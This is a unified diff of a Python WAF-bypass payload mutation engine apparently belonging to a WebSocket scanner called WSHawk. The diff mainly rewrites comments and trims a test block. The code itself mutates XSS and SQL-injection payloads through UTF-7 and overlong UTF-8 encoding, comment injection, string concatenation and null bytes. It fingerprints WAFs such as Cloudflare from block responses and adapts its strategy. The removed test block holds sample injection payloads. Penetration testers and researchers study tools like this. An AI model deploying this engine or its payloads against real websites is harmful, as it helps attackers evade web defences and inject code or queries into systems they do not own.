@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-WSHawk Elite Payload Mutation Engine
-Production-grade WAF bypass with intelligent learning
+WSHawk Payload Mutation Engine
+Production-grade WAF bypass with adaptive learning
 """
 
 import random
@@ -24,11 +24,11 @@ class MutationStrategy(Enum):
 
 class PayloadMutator:
     """
-    Elite payload mutation engine with WAF bypass capabilities
+    Payload mutation engine with WAF bypass capabilities
     """
     
     def __init__(self):
-        # Learning system with weighted strategies
+        # Weighted strategy scoring system
         self.strategy_scores = defaultdict(lambda: 1.0)  # Start at 1.0
         self.failed_mutations = set()
         self.successful_patterns = defaultdict(list)
@@ -81,17 +81,17 @@ class PayloadMutator:
         # Unicode encoding
         mutations.append(''.join(f'\\u{ord(c):04x}' for c in payload))
         
-        # UTF-7 encoding (XSS goldmine)
+        # UTF-7 encoding
         try:
             mutations.append(payload.encode('utf-7').decode('ascii'))
-        except:
+        except (UnicodeEncodeError, UnicodeDecodeError):
             pass
         
         # UTF-16 BE
         try:
             utf16 = payload.encode('utf-16-be')
             mutations.append(''.join(f'%{b:02x}' for b in utf16))
-        except:
+        except (UnicodeEncodeError, UnicodeDecodeError):
             pass
         
         # Base64 encoding
@@ -107,7 +107,7 @@ class PayloadMutator:
                     mixed[i] = f'&#{ord(mixed[i])};'
             mutations.append(''.join(mixed))
         
-        # Overlong UTF-8 (bypass some filters)
+        # Overlong UTF-8
         mutations.append(payload.replace('<', '%C0%BC').replace('>', '%C0%BE'))
         
         # Character reference obfuscation
@@ -135,7 +135,7 @@ class PayloadMutator:
         """Universal comment injection for all payload types"""
         mutations = []
         
-        # SQL comment injection (works for ANY SQL payload)
+        # SQL comment injection
         mutations.append(payload.replace(' ', '/**/'))
         mutations.append(payload.replace(' ', '--\n'))
         mutations.append(payload.replace('=', '/**/=/**/'))
@@ -153,7 +153,7 @@ class PayloadMutator:
             mutations.append(payload.replace('>', '><!---->'))
             mutations.append(payload.replace('<', '</**/>'))
         
-        # JavaScript comment injection (works for any JS)
+        # JavaScript comment injection
         mutations.append(payload.replace('(', '(/*/'))
         mutations.append(payload.replace(')', '/*/'))
         mutations.append(payload.replace('alert', 'ale/**/rt'))
@@ -181,17 +181,17 @@ class PayloadMutator:
         return mutations[:count]
     
     def _concatenation_mutations(self, payload: str, count: int) -> List[str]:
-        """Universal string concatenation (not hardcoded)"""
+        """Universal string concatenation"""
         mutations = []
         
-        # JavaScript concatenation (works for ANY JS payload)
+        # JavaScript concatenation
         if len(payload) >= 4:
             mid = len(payload) // 2
             mutations.append(f"'{payload[:mid]}'+ '{payload[mid:]}'")
             mutations.append(f"'{payload[:mid]}'+ `{payload[mid:]}`")
             mutations.append(f"`{payload[:mid]}${{'{payload[mid:]}'}}`")
         
-        # SQL concatenation (works for ANY SQL)
+        # SQL concatenation
         if len(payload) >= 4:
             mid = len(payload) // 2
             mutations.append(f"'{payload[:mid]}'||'{payload[mid:]}'")
@@ -212,7 +212,7 @@ class PayloadMutator:
         return mutations[:count]
     
     def _bypass_mutations(self, payload: str, count: int) -> List[str]:
-        """Advanced filter bypass mutations"""
+        """Bypass mutations"""
         mutations = []
         
         # Null byte injection
@@ -304,13 +304,7 @@ class PayloadMutator:
     
     def learn_from_response(self, payload: str, response: str, is_blocked: bool, response_time: float = 0):
         """
-        Advanced learning from server response
-        
-        Args:
-            payload: Payload sent
-            response: Server response
-            is_blocked: Whether blocked
-            response_time: Response time in seconds
+        Heuristic learning from server response
         """
         response_lower = response.lower()
         
@@ -320,7 +314,7 @@ class PayloadMutator:
         if is_blocked:
             self.failed_mutations.add(payload)
             
-            # Advanced WAF detection
+            # WAF signature detection
             waf_signatures = {
                 'cloudflare': ['cloudflare', 'cf-ray', 'error 1020'],
                 'akamai': ['akamai', 'reference #'],
@@ -335,7 +329,7 @@ class PayloadMutator:
                     self.waf_detected = waf
                     break
             
-            # Detect filter patterns (generic)
+            # Detect filter patterns
             filter_indicators = [
                 ('bad request', 'generic_filter'),
                 ('malicious', 'malicious_filter'),
@@ -388,12 +382,9 @@ class PayloadMutator:
     
     def get_recommended_strategy(self) -> MutationStrategy:
         """
-        Intelligent strategy recommendation based on learning
-        
-        Returns:
-            Best mutation strategy
+        Adaptive strategy recommendation based on heuristics
         """
-        # If WAF detected, use specific strategies
+        # If WAF detected, use targeted strategies
         if self.waf_detected:
             waf_strategies = {
                 'cloudflare': MutationStrategy.ENCODING,
@@ -417,23 +408,15 @@ class PayloadMutator:
             best_strategy = max(self.strategy_scores.items(), key=lambda x: x[1])
             return MutationStrategy(best_strategy[0])
         
-        # Default
         return MutationStrategy.ENCODING
     
-    def generate_smart_payloads(self, base_payload: str, max_count: int = 15) -> List[str]:
+    def generate_adaptive_payloads(self, base_payload: str, max_count: int = 15) -> List[str]:
         """
-        Generate intelligently mutated payloads using weighted strategies
-        
-        Args:
-            base_payload: Base payload
-            max_count: Maximum variants
-            
-        Returns:
-            List of smart mutations
+        Generate adaptively mutated payloads using weighted strategies
         """
         payloads = [base_payload]
         
-        # Get strategy priority (sorted by score)
+        # Get strategy priority
         sorted_strategies = sorted(
             self.strategy_scores.items(),
             key=lambda x: x[1],
@@ -443,14 +426,13 @@ class PayloadMutator:
         # Use top strategies
         for strategy_name, score in sorted_strategies[:3]:
             strategy = MutationStrategy(strategy_name)
-            count = int(3 * score)  # More mutations for higher scores
+            count = int(3 * score)
             payloads.extend(self.mutate_payload(base_payload, strategy, count))
         
         # Always try recommended strategy
         recommended = self.get_recommended_strategy()
         payloads.extend(self.mutate_payload(base_payload, recommended, 3))
         
-        # Remove duplicates while preserving order
         seen = set()
         unique_payloads = []
         for p in payloads:
@@ -460,47 +442,6 @@ class PayloadMutator:
         
         return unique_payloads[:max_count]
 
-
-# Test the elite mutation engine
 if __name__ == "__main__":
     mutator = PayloadMutator()
-    
-    print("=" * 70)
-    print("WSHawk ELITE Payload Mutation Engine Test")
-    print("=" * 70)
-    
-    # Test 1: XSS mutations
-    xss_payload = "<script>alert(1)</script>"
-    print(f"\n1. XSS Payload: {xss_payload}")
-    print("\nTag breaking mutations:")
-    for p in mutator.mutate_payload(xss_payload, MutationStrategy.TAG_BREAKING, 3):
-        print(f"  {p[:70]}")
-    
-    # Test 2: SQL mutations (NO SELECT keyword)
-    sql_payload = "' OR 1=1--"
-    print(f"\n2. SQL Payload (no SELECT): {sql_payload}")
-    print("\nComment mutations:")
-    for p in mutator.mutate_payload(sql_payload, MutationStrategy.COMMENT_INJECTION, 3):
-        print(f"  {p}")
-    
-    # Test 3: Advanced encoding
-    print(f"\n3. Advanced encoding mutations:")
-    for p in mutator.mutate_payload(xss_payload, MutationStrategy.ENCODING, 5):
-        print(f"  {p[:70]}...")
-    
-    # Test 4: Learning system
-    print(f"\n4. Testing advanced learning:")
-    mutator.learn_from_response("<script>alert(1)</script>", "403 Forbidden - Cloudflare", True)
-    mutator.learn_from_response("' OR 1=1", "Bad Request - Malicious pattern detected", True)
-    
-    print(f"  WAF detected: {mutator.waf_detected}")
-    print(f"  Filter patterns: {mutator.filter_patterns}")
-    print(f"  Recommended strategy: {mutator.get_recommended_strategy().value}")
-    
-    # Test 5: Smart payload generation
-    print(f"\n5. Smart payload generation:")
-    smart = mutator.generate_smart_payloads("' OR 'a'='a", 5)
-    for p in smart:
-        print(f"  {p}")
-    
-    print("\n[SUCCESS] ELITE Mutation Engine working!")
+    print("WSHawk Payload Mutation Engine loaded.")
